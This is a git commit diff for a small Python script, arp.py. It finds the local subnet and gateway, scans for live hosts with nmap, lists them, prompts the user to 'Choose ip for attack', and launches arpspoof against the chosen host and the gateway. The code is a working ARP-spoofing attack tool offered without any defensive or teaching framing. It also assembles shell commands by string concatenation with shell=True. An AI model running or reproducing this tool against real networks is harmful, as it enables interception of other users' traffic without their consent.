37252285a80a1ff264962d59a2ca71ac29c6cd7e
LQParadise <liqi32239630@qq.com>
2017-04-23 23:31:48 +0800

    arp.py

--- arp.py
+++ arp.py
@@ -4,11 +4,15 @@ import subprocess
 import re
 import time
 
-def GetNetwork():
-    Res = subprocess.Popen("route",shell=True,stdout=subprocess.PIPE)
-    stdoutput = Res.communicate()
+def Get_Content(cmd):
+    p = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
+    stdoutput = p.communicate()
     pattern = stdoutput[0]
-    out = pattern.split()
+    return pattern
+def GetNetwork():
+    cmd = 'route'
+    content = Get_Content(cmd)
+    out = content.split()
     network = out[20]
     iface = out[27]
     GateWay = out[13]
@@ -18,7 +22,7 @@ def MakeCommand():
     network = GetNetwork()
     command0 = 'touch 433wifi.txt'
     command1 = network[0]+'/24'
-    command2 = 'fping '+'-ag '+command1+' > '+'433wifi.txt '
+    command2 = 'nmap -sP '+command1+' > '+'433wifi.txt '
     subprocess.Popen(command0,shell=True)
     p =  subprocess.Popen(command2,shell=True) 
     p.wait()
@@ -26,26 +30,33 @@ def MakeCommand():
     return Content
 
 def Read_File(File_name):
-    cmd = 'cat '+File_name
-    Res = subprocess.Popen(cmd,shell = True,stdout=subprocess.PIPE)
-    stdoutput = Res.communicate()
-    Content = stdoutput[0]
-    out = Content.split()
-    return out
+    cmd = 'cat '+File_name+" | grep 'MAC' |cut -d '(' -f 2|cut -d ')' -f 1"
+    cmd1 = 'cat '+File_name+" | grep 'Nmap scan'|cut -d ' ' -f 5"
+    os = Get_Content(cmd)
+    OS = os.split('\n')
+    ip = Get_Content(cmd1)
+    IP = ip.split('\n')
+    return OS,IP
 
 def Attack():
+    MakeCommand()
     Net_info = GetNetwork()
     Iface = Net_info[1]
     GateWay = Net_info[2]
-    IP_Pool = Read_File("433wifi.txt")
+    info = Read_File("433wifi.txt")
+    os = info[0]
+    ip = info[1]
     a=0
-    for ip in IP_Pool:
-        print ("%d:%s"%(a,ip))
-        a+=1
+    while a<len(ip)-1:
+        IP = str(ip[a])
+        OS = str(os[a])
+        print ("%d:%s %s"%(a,IP,OS))
+        a=a+1
     i = raw_input("Choose ip for attack:")
     i=int(i)
-    Attack_IP = IP_Pool[i]
+    Attack_IP = ip[i]
     cmd = 'arpspoof '+'-i '+Iface+' -t '+ Attack_IP +' '+GateWay
     subprocess.Popen(cmd,shell=True)
+    
 Attack()
 
